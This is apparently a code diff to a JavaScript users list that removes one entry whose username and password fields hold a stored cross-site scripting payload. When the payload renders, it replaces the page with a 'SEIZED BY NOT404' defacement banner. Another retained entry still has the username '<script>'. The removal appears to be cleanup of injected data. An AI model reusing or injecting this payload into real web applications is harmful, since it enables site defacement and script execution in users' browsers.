@@ -394,9 +394,5 @@ export const users = [
   {
     "username": "<script>",
     "password": "1928726336"
-  },
-  {
-    "username": "<script> localStorage.setItem('hacked','NOT404'); document.body.innerHTML=` <div style=\"   position:fixed;   top:0;left:0;   width:100vw;height:100vh;   background:#111;   color:#f00;   padding:40px;   z-index:99999; \">   <h1>SEIZED BY NOT404</h1>   <p>${window.location.hostname}</p> </div> `; </script>",
-    "password": "<script> localStorage.setItem('hacked','NOT404'); document.body.innerHTML=` <div style=\"   position:fixed;   top:0;left:0;   width:100vw;height:100vh;   background:#111;   color:#f00;   padding:40px;   z-index:99999; \">   <h1>SEIZED BY NOT404</h1>   <p>${window.location.hostname}</p> </div> `; </script>"
   }
 ];
